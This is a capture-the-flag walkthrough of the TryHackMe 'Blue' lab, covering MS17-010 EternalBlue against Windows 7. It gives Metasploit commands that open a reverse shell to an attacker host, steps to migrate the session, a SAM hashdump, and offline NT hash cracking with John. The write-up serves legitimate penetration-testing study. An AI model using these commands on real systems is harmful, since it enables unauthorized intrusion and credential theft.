# Blue

**Platform:** TryHackMe  
**Room:** [Blue](https://tryhackme.com/room/blue)  
**Difficulty:** Easy 
**Type:** ⚑ Walkthru
**Status:** ✅ Completed  
---

## Executive Summary

Blue targets a Windows 7 machine vulnerable to MS17-010 (EternalBlue) — one of the most impactful SMB vulnerabilities ever disclosed, famously weaponized by the WannaCry ransomware in 2017. The attack chain is short: enumerate SMB, confirm the vulnerability, exploit it with Metasploit to land a SYSTEM shell, then perform post-exploitation credential harvesting and cracking.

While the exploitation step here uses Metasploit (which is restricted on the OSCP exam), the core skill being practiced is recognizing and confirming SMB vulnerability exposure through nmap scripting, understanding the EternalBlue exploit mechanism, and performing post-exploitation hashdump + offline cracking. The manual exploitation path (without Metasploit) exists via the AutoBlue or custom Python PoC implementations.

**Key techniques practiced:**
- nmap vulnerability scanning with `--script vuln`
- MS17-010 EternalBlue exploitation
- Meterpreter session management and shell migration
- NTLM hash dumping via `hashdump`
- Offline hash cracking with John the Ripper

**Verdict:** Essential room. EternalBlue is foundational Windows knowledge for any penetration tester.

---

## Environment

| Field | Value |
|-------|-------|
| Target OS | Windows 7 SP1 x64 |
| Open Ports | 135, 139, 445 (SMB), 3389 (RDP) |
| Vulnerability | MS17-010 (EternalBlue) |
| Goal | SYSTEM shell + retrieve flags |

---

## Enumeration

### nmap — Service & Vulnerability Scan

```bash
# Initial service scan
nmap -sV -sC -p- <target-ip>

# Key findings
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional (workgroup: WORKGROUP)
3389/tcp open rdp          Microsoft Terminal Services

# Targeted vulnerability scan against SMB
nmap -p 445 --script vuln <target-ip>
```

The `--script vuln` output confirms MS17-010:

```
Host script results:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

**MS17-010 explained:** EternalBlue exploits a buffer overflow in the Windows SMBv1 protocol handler. A specially crafted packet triggers the overflow, allowing an attacker to execute arbitrary shellcode with SYSTEM privileges — no credentials required. This vulnerability affects Windows XP through Windows Server 2008 R2 that haven't been patched with MS17-010.

---

## Exploitation

### Metasploit — EternalBlue

```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <attacker-ip>
set payload windows/x64/shell/reverse_tcp
run
```

The exploit succeeds and returns a shell running as `NT AUTHORITY\SYSTEM` — the highest privilege level on a Windows system, equivalent to root on Linux.

### Session Migration

The initial shell is fragile. Migrating to a stable process prevents losing the session and enables full Meterpreter capabilities:

```bash
# Upgrade shell to Meterpreter
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# Identify stable processes to migrate to (SYSTEM-owned)
sessions -i 2
ps

# Migrate to spoolsv.exe or winlogon.exe (run as SYSTEM)
migrate <PID>

# Verify
getuid
# Server username: NT AUTHORITY\SYSTEM
```

Migration moves the Meterpreter payload into a longer-lived process, preventing the session from dying if the original exploit process exits.

---

## Post-Exploitation

### Credential Harvesting

```bash
# Dump password hashes from SAM database
hashdump

# Output format: username:RID:LM_hash:NT_hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
```

`hashdump` reads the SAM (Security Account Manager) database, which stores Windows password hashes. The LM hash portion (`aad3b435b51404ee`) is a null LM hash — Windows has disabled LM hashing by default since Vista, so only the NT hash matters.

### Offline Hash Cracking with John

```bash
# Save the NT hash to a file
echo "Jon:<NTLM_HASH>" > hash.txt

# Crack with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt

# Result
Jon:alqfna22
```

This demonstrates that even without plaintext passwords, captured NTLM hashes can often be cracked offline — especially when users choose weak passwords.

---

## Flags

Flags are located across the filesystem, requiring SYSTEM access to retrieve all three:

```bash
# Flag 1 — filesystem root
C:\flag1.txt

# Flag 2 — location requires SAM knowledge to find
C:\Windows\System32\config\

# Flag 3 — in user's documents
C:\Users\Jon\Documents\
```

```bash
# Search from Meterpreter if locations are unknown
search -f flag*.txt
```

---

## Key Takeaways

**For OSCP:** Metasploit is allowed for one machine on the exam. EternalBlue is a valid choice if you encounter an unpatched Windows 7/2008 R2 target. Know the manual exploitation path too — AutoBlue or the Python PoC scripts — in case Metasploit fails or you've already used your one allowed attempt.

**Detection perspective:** MS17-010 is trivially detectable via IDS signatures and should be patched on any modern network. Encountering it in the wild today typically means severely neglected infrastructure or air-gapped legacy systems.

**Critical commands to internalize:**
```bash
nmap -p 445 --script vuln <ip>          # Confirm MS17-010
migrate <PID>                            # Stabilize Meterpreter session
hashdump                                 # Dump SAM hashes
john --format=NT --wordlist=<wl> <hash> # Crack NT hashes
```

---

## References

- [MS17-010 Microsoft Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)
- [AutoBlue — Manual EternalBlue PoC](https://github.com/3ndG4me/AutoBlue-MS17-010)

---
